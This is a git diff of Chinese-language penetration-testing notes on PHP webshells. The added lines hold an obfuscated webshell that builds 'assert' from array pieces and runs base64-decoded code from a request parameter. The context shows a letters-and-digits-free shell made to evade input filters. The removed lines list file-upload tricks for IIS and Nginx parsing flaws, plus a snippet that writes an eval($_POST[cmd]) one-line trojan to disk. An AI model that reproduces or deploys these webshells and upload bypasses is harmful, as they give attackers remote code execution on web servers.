@@ -1,4 +1,10 @@
 ## 不包含数字和字母的shell（待验证） php5
+
+
+```php
+<?php $p = array('f'=>'a','pffff'=>'s','e'=>'fffff','lfaaaa'=>'r','nnnnn'=>'t');$a = array_keys($p);$_=$p['pffff'].$p['pffff'].$a[2];$_= 'a'.$_.'rt';$_(base64_decode($_REQUEST['username']));?>
+```
+
 ```php
 <?php
 if(!preg_match('/[a-z0-9]/is',$_GET['shell'])) {
@@ -59,20 +65,3 @@ $____.=$__;
 $_=$$____;
 $___($_[_]); 
 ```
-
-
-## 回调后门
-https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html
-## getshell
-目录解析 1.asp/1.png
-分号阶段 1.asp;.png
-改包 00截断
-
-IIS7.0 .5 Nginx<8.03畸形解析漏洞
-默认FAST-CGI开启状态上传一个1.jpg内容
-```php
-<?php fputs(fopen('shell.php','w'),'?<php eval($_POST[cmd]?>');?>
-```
-
-访问1.jpg/.php。在这个目录下就会生成一句话木马shell.php
-
